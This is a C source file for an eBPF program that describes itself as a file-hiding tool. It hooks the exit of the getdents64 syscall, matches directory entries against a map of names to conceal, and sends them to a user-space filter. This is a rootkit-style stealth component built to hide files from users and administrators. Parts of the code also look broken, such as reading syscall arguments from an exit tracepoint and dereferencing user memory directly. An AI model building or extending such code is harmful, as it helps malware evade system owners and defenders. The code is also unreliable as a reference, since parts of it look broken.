// SPDX-License-Identifier: GPL-2.0
/*
 * hook.bpf.c - eBPF program for file hiding
 * 
 * Architecture: eBPF 用于监控 getdents64，识别隐藏条目，
 * 通过 ringbuffer 发送给用户空间，用户空间程序负责实际过滤
 * 
 * 或者：如果内核支持 bpf_override_return，可直接在 BPF 中处理
 */

#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>

/* Hidden files map - key: filename, value: flags (1=file, 2=dir) */
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 64);
    __type(key, char[256]);
    __type(value, __u32);
} hidden_files SEC(".maps");

/* Stats map for debugging */
struct {
    __uint(type, BPF_MAP_TYPE_ARRAY);
    __uint(max_entries, 4);
    __type(key, __u32);
    __type(value, __u64);
} stats SEC(".maps");

/* Ringbuffer for logging hidden entries to userspace */
struct {
    __uint(type, BPF_MAP_TYPE_RINGBUF);
    __uint(max_entries, 4096);
} rb SEC(".maps");

#define STAT_CALLS 0
#define STAT_HIDDEN 1
#define STAT_ERRORS 2
#define STAT_ENTRIES 3

/* Event structure sent to userspace */
struct hide_event {
    __u64 pid;
    char name[256];
    __u32 is_dir;
    __u32 timestamp;
};

/* Directory entry structure (same as linux getdents64) */
struct linux_dirent64 {
    __u64 d_ino;
    __s64 d_off;
    __u16 d_reclen;
    __u8 d_type;
    char d_name[256];
};

/* Helper to check if entry should be hidden */
static __always_inline int should_hide(const char *name, int is_dir)
{
    __u32 *val = bpf_map_lookup_elem(&hidden_files, name);
    if (val) {
        if (*val == 1 && !is_dir)  /* hide files */
            return 1;
        if (*val == 2 && is_dir)   /* hide directories */
            return 1;
    }
    return 0;
}

/* Tracepoint for sys_exit_getdents64 */
SEC("tracepoint/syscalls/sys_exit_getdents64")
int trace_exit_getdents64(struct trace_event_raw_sys_exit *ctx)
{
    __u64 pid_tgid = bpf_get_current_pid_tgid();
    __u32 pid = pid_tgid >> 32;
    
    long ret = ctx->ret;
    if (ret <= 0)
        return 0;

    /* Get buffer pointer from first argument */
    unsigned long dirent = ctx->args[1];
    int count = (int)ret;
    
    char *pos = (char *)dirent;
    char *end = pos + count;
    int hidden_count = 0;
    int total_count = 0;

    #pragma unroll
    for (int i = 0; i < 128; i++) {
        if (pos >= end)
            break;
        
        struct linux_dirent64 *d = (struct linux_dirent64 *)pos;
        
        if (d->d_reclen == 0)
            break;
        
        total_count++;
        int is_dir = (d->d_type == 4); /* DT_DIR = 4 */
        
        /* Check if this entry should be hidden */
        if (should_hide(d->d_name, is_dir)) {
            hidden_count++;
            
            /* Send event to ringbuffer */
            struct hide_event *event = bpf_ringbuf_reserve(&rb, sizeof(*event), 0);
            if (event) {
                event->pid = pid;
                event->is_dir = is_dir;
                event->timestamp = bpf_ktime_get_ns();
                __builtin_memcpy(event->name, d->d_name, 256);
                bpf_ringbuf_submit(event, 0);
            }
        }
        
        pos += d->d_reclen;
    }

    /* Update stats */
    __u32 key = STAT_CALLS;
    __u64 *calls = bpf_map_lookup_elem(&stats, &key);
    if (calls)
        __sync_fetch_and_add(calls, 1);
    
    if (hidden_count > 0) {
        key = STAT_HIDDEN;
        __u64 *hidden = bpf_map_lookup_elem(&stats, &key);
        if (hidden)
            __sync_fetch_and_add(hidden, hidden_count);
    }
    
    key = STAT_ENTRIES;
    __u64 *entries = bpf_map_lookup_elem(&stats, &key);
    if (entries)
        __sync_fetch_and_add(entries, total_count);

    return 0;
}

char LICENSE[] SEC("license") = "GPL";
